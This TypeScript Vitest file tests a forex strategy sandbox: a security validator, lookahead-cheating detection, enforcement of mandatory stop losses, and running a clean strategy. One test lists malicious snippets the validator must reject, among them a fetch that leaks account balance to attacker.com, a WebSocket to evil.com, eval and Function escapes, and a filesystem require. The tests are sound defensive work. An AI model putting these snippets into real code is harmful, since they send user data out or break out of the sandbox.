import { describe, it, expect } from 'vitest';
import {
  validateStrategySecurity,
  executeStrategyBar,
} from '../workerSandbox';
import { Candle } from '../../types/forex';

describe('Strategy Sandbox Execution Isolation Suite (Stage 1b)', () => {
  const sampleCandles: Candle[] = [
    { time: 1700000000, open: 1.085, high: 1.088, low: 1.084, close: 1.087, tickVolume: 200 },
    { time: 1700003600, open: 1.087, high: 1.091, low: 1.086, close: 1.090, tickVolume: 250 },
    { time: 1700007200, open: 1.090, high: 1.094, low: 1.089, close: 1.093, tickVolume: 220 },
  ];

  const defaultContext = {
    symbol: 'EURUSD' as const,
    balance: 10000,
    equity: 10000,
    openPositions: [],
  };

  it('strictly blocks forbidden network and system globals (explicit failing-cases)', () => {
    const maliciousSnippets = [
      'fetch("https://attacker.com/leak?data=" + ctx.balance)',
      'const xhr = new XMLHttpRequest();',
      'const ws = new WebSocket("wss://evil.com");',
      'importScripts("evil.js")',
      'const w = new Worker("sub.js")',
      'window.location.href = "https://phishing.com"',
      'document.cookie = "stolen"',
      'localStorage.setItem("key", "val")',
      'eval("process.exit(1)")',
      'Function("return process")()',
      'const fs = require("fs");',
      'globalThis.leaked = true',
    ];

    for (const code of maliciousSnippets) {
      const security = validateStrategySecurity(code);
      expect(security.valid).toBe(false);
      expect(security.error).toBeDefined();
    }
  });

  it('allows safe, legitimate quantitative strategies to pass security validation', () => {
    const safeCode = `
      function onBar(ctx, bar) {
        if (bar.close > bar.open) {
          ctx.buy('EURUSD', 0.5, bar.low - 0.0020, bar.high + 0.0040);
        }
      }
    `;
    const security = validateStrategySecurity(safeCode);
    expect(security.valid).toBe(true);
  });

  it('traps lookahead cheating attempts with CANARY_LOOKAHEAD_VIOLATION (explicit failing-case)', () => {
    const cheatingCode = `
      function onBar(ctx, bar) {
        // Cheating strategy attempts to inspect future bar
        const futureBar = ctx.getBar(ctx.currentBarIndex + 1);
        if (futureBar && futureBar.close > bar.close) {
          ctx.buy('EURUSD', 1.0, bar.low - 0.0010);
        }
      }
    `;

    // Evaluating bar at index 1 when 3 bars exist
    const result = executeStrategyBar(cheatingCode, sampleCandles, 1, defaultContext);
    expect(result.error).toContain('CANARY_LOOKAHEAD_VIOLATION');
    expect(result.signals).toHaveLength(0);
  });

  it('enforces mandatory stop loss: rejects orders missing stop loss (explicit failing-case)', () => {
    const noSlCode = `
      function onBar(ctx, bar) {
        ctx.buy('EURUSD', 1.0, 0); // Missing SL (0)
      }
    `;

    const result = executeStrategyBar(noSlCode, sampleCandles, 1, defaultContext);
    expect(result.signals).toHaveLength(0);
    expect(result.logs.some((l) => l.includes('MANDATORY_STOP_LOSS_REJECT'))).toBe(true);
  });

  it('successfully executes clean strategy bar and returns valid signals and visual annotations', () => {
    const validStrategy = `
      function onBar(ctx, bar) {
        const prev = ctx.getBar(ctx.currentBarIndex - 1);
        if (prev && bar.close > prev.high) {
          ctx.buy('EURUSD', 0.25, Number((bar.close - 0.0025).toFixed(5)), Number((bar.close + 0.0050).toFixed(5)), undefined, undefined, 'MOMENTUM_BREAKOUT');
          ctx.addVisualMarker({
            time: bar.time,
            price: bar.close,
            type: 'entry_buy',
            label: 'BUY ↑',
            color: '#10b981'
          });
        }
      }
    `;

    const result = executeStrategyBar(validStrategy, sampleCandles, 1, defaultContext);
    expect(result.error).toBeUndefined();
    expect(result.signals).toHaveLength(1);
    expect(result.signals[0].action).toBe('BUY');
    expect(result.signals[0].lots).toBe(0.25);
    expect(result.signals[0].sl).toBeGreaterThan(0);
    expect(result.visualMarkers).toHaveLength(1);
  });
});
